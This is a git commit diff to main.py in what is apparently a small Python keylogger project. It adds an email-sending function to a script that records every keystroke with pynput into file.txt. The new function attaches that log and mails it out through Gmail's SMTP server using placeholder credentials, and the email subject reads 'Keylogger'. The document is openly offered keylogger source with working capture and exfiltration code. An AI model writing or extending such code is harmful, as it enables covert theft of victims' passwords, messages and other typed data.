411b26821b517cac7c1d932cca7dfe20828f35c7
hyperloop11 <58222916+hyperloop11@users.noreply.github.com>
2019-12-18 14:09:07 +0700

    Update main.py
    function to send email

--- main.py
+++ main.py
@@ -3,7 +3,12 @@ f.write('adfgsfdgfh')
 f.close()'''
 # All imports
 from pynput.keyboard import Listener #1
-import tempfile
+import smtplib #2
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+import tempfile #3
 
 # functions
 def writetofile(key):
@@ -17,7 +22,35 @@ def writetofile(key):
             char = char.replace(keystroke[j], value[j])
     with open("file.txt", 'a') as f:
         f.write(char)
+        
+def emailsender():
+    fromadd = "my_email"
+    toadd = "my_email"
 
+    msg = MIMEMultipart()
+
+    msg['From'] = fromadd
+    msg['To'] = toadd
+    msg['Subject'] = 'Keylogger' # add subj here
+
+    msg.attach(MIMEText('log', 'plain')) # wite body here
+
+    filename = "file.txt" #extension imp
+    attachment = open('file.txt', 'rb')
+
+    p = MIMEBase('application', 'octet-stream')
+    p.set_payload((attachment).read())
+    encoders.encode_base64(p)
+    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
+    msg.attach(p)
+
+    smtpobj = smtplib.SMTP('smtp.gmail.com', 587)
+    smtpobj.ehlo()
+    smtpobj.starttls()
+    smtpobj.login(fromadd ,'my_password') # add password 
+    text = msg.as_string()
+    smtpobj.sendmail(fromadd , toadd , text)
+    smtpobj.quit()        
 
 with Listener(on_press=writetofile) as l:
     l.join()
